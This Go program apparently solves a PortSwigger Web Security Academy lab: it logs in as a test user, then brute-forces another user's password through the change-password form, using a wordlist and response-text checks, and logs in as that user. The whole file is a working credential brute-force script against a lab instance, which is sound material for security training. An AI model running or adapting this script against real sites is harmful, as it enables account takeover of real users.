// https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
)

const trace bool = false

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	baseUrl := "https://0afb008104e15748c1a72c8c006e0099.web-security-academy.net"
	loginUrl := baseUrl + "/login"
	changePassUrl := baseUrl + "/my-account/change-password"
	myUser := "wiener"
	myPass := "peter"
	vicUser := "carlos"
	vicPass := ""

	client, err := newClient()
	if err != nil {
		return err
	}

	_, _, err = get(baseUrl, client)
	if err != nil {
		return err
	}

	_, _, err = login(loginUrl, myUser, myPass, "", client)
	if err != nil {
		return err
	}

	err = tryPass(func(pass string) (bool, error) {
		fmt.Printf("Try pass: %v\n", pass)
		status, body, err := changePass(changePassUrl, vicUser, pass, "1", "2", client)
		if err != nil {
			return false, err
		}
		if status == 200 && !strings.Contains(body, "Current password is incorrect") {
			vicPass = pass
			return false, nil
		}
		return true, nil
	})
	if err != nil {
		return err
	}
	if vicPass == "" {
	    return fmt.Errorf("Pass not found")
	}

	fmt.Printf("Pass found: %v\n", vicPass)

	_, _, err = login(loginUrl, vicUser, vicPass, "", client)
	if err != nil {
		return err
	}
	return nil
}

func resetPass(u, username, csrfToken, host string, client *http.Client) (int, string, error) {
	data := url.Values{
		"username": {username},
		"csrf": {csrfToken},
	}

	return post(u, data, client)
}

func login(u, username, password, csrfToken string, client *http.Client) (int, string, error) {
	data := url.Values{
		"username": {username},
		"password": {password},
		"csrf": {csrfToken},
	}

	return post(u, data, client)
}

func changePass(u, username, currPass, newPass1, newPass2 string, client *http.Client) (int, string, error) {
	data := url.Values{
		"username": {username},
		"current-password": {currPass},
		"new-password-1": {newPass1},
		"new-password-2": {newPass2},
	}

	return post(u, data, client)
}

func tryPass(fn func(pass string) (bool, error)) (error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		pass := sc.Text()
		cont, err := fn(pass)
		if err != nil {
			return err
		}
		if !cont {
			break
		}
	}
	return nil
}

func postCode(u, code, csrfToken string, client *http.Client) (int, string, error) {
	data := url.Values{
		"mfa-code": {code},
		"csrf": {csrfToken},
	}

	return post(u, data, client)
}

func post(u string, data url.Values, client *http.Client) (int, string, error) {
	req, err := http.NewRequest("POST", u, strings.NewReader(data.Encode()))
	if err != nil {
		return 0, "", err
	}

	dumpReqOut(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	dumpResp(resp)

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func get(u string, client *http.Client) (int, string, error) {
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return 0, "", err
	}

	dumpReqOut(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	dumpResp(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}
	return resp.StatusCode, string(body), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(body string) string {
	return string(csrfRE.FindStringSubmatch(body)[1])
}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}

func dumpReqOut(req *http.Request) {
	if !trace {
		return
	}

	dump, err := httputil.DumpRequestOut(req, true)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("=====\n%q\n", dump)
}

func dumpResp(resp *http.Response) {
	if !trace {
		return
	}

	dump, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("=====\n%q\n", dump)
}
